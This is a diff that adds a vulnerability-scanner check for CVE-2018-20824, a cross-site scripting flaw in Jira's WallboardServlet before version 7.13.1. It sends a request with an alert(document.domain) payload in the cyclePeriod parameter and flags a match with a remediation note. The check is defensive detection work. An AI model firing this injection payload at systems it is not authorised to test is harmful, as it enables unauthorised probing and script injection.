@@ -1,0 +1,22 @@
+metadata:
+  language: v1-beta
+  name: "Atlassian Jira WallboardServlet <7.13.1 - Cross-Site Scripting"
+  description: "The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the cyclePeriod parameter."
+  author: "mrrootsec"
+  tags: "xss", "cve", "jira"
+
+run for each:
+  potential_path = "/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
+
+given request then
+  send request called jxss:
+    path: {potential_path}
+    method: "GET"
+
+  if {jxss.response.status_code} is "200" and "timeout: alert(document.domain)" in {jxss.response.body} then
+    report issue:
+      severity: medium
+      confidence: certain
+      detail: "Vulnerable to CVE-2018-20824 - The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the cyclePeriod parameter."
+      remediation: "Upgrade Jira to the latest version"
+  end if
